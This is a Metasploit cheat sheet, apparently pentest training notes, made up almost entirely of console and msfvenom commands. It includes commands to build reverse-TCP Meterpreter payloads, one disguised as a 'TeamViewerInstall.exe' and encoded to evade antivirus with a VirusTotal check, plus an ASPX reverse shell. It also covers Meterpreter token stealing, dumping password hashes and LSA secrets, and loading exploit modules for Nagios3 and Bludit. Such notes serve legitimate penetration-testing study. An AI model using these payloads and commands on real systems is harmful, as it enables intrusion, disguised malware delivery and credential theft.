# Modules
#### Syntax
```
<No.> <type>/<os>/<service>/<name>
```

```
794   exploit/windows/ftp/scriptftp_list
```
#### Specific Search
```
search type:exploit platform:windows cve:2021 rank:excellent microsoft
```
#### Module Information
```
info
```
#### Permanent Target Specification
```
setg RHOSTS 10.10.10.40
```
# Targets
#### Show Targets
```
show targets
```
# Payloads
#### List Payloads
```
show payloads
```
#### Searching for Specific Payload
```
grep meterpreter show payloads
```

```
grep meterpreter grep reverse_tcp show payloads
```

```
set payload <payload number>
```
# Encoders
#### List Encoders
```
show encoders
```
#### Selecting an Encoder
```
msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
```
#### Generating Payload - With Encoding
```
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

```
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -o ./TeamViewerInstall.exe
```
# Databases
#### PostgreSQL Status
```
sudo service postgresql status
```
#### Start PostgreSQL
```
sudo systemctl start postgresql
```
#### Initiate a Database
```
sudo msfdb init
```
#### Connect to the Initiated Database
```
sudo msfdb run
```
#### Reinitiate the Database
```
msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q

db_status
```
## Workspaces
```
workspace
```
```
workspace -a Target_1
```
#### Importing Scan Results
```
cat Target.nmap
```
#### Importing Scan Results
```
db_import Target.xml
```
#### MSF - Nmap
```
db_nmap -sV -sS 10.10.10.8
```
# Plugins
```
ls /usr/share/metasploit-framework/plugins
```
#### Load Nessus
```
load nessus
```
## Installing new Plugins
#### Downloading MSF Plugins
```
git clone https://github.com/darkoperator/Metasploit-Plugins
ls Metasploit-Plugins
```
#### Copying Plugin to MSF
```
sudo cp ./Metasploit-Plugins/pentest.rb /usr/share/metasploit-framework/plugins/pentest.rb
```
#### Load Plugin
```
msfconsole -q
load pentest
```
# Meterpreter
#### Meterpreter Migration
```shell
getuid
ps
steal_token 1836
getuid
```
#### Dumping Hashes
```shell
hashdump
```

```
lsa_dump_sam
```

```
lsa_dump_secrets
```
# Importing Modules
```
searchsploit nagios3
```

```
searchsploit -t Nagios3 --exclude=".py"
```
#### Directory Structure
```
ls /usr/share/metasploit-framework/
```
```
ls .msf4/
```
#### Loading Additional Modules at Runtime
```
cp ~/Downloads/9861.rb /usr/share/metasploit-framework/modules/exploits/unix/webapp/nagios3_command_injection.rb
```

```
msfconsole -m /usr/share/metasploit-framework/modules/
```
#### Loading Additional Modules
```
loadpath /usr/share/metasploit-framework/modules/
```

```
reload_all
```
## Porting Over Scripts into Metasploit Modules
#### Porting MSF Modules
```
ls /usr/share/metasploit-framework/modules/exploits/linux/http/ | grep bludit
```
```
cp ~/Downloads/48746.rb /usr/share/metasploit-framework/modules/exploits/linux/http/bludit_auth_bruteforce_mitigation_bypass.rb
```
# MSFVenom
#### Generating Payload
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=1337 -f aspx > reverse_shell.aspx
```
#### Setting Up Multi/Handler
```
msfconsole -q 
```
```
use multi/handler
```
# MSF VirusTotal
```
msf-virustotal -k <API key> -f TeamViewerInstall.exe
```
